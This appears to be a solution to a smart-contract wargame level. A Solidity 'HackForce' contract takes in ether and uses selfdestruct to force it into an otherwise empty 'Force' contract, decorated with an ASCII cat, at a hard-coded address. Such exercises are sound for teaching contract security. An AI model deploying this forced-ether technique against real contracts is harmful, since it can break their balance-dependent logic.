// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10; // Latest solidity version

import "./Force.sol";

contract HackForce {

  address payable private owner = payable(0xF7c76375227291b07Ed724f3C312B9029e8bA4fA);
  mapping (address => uint) allocations;

  constructor() public payable {
    allocations[owner] = msg.value;
  }

  receive() external payable {
    allocations[owner] = msg.value;
  }

  function close() public { 
    selfdestruct(owner); 
  }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10; // Latest solidity version

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}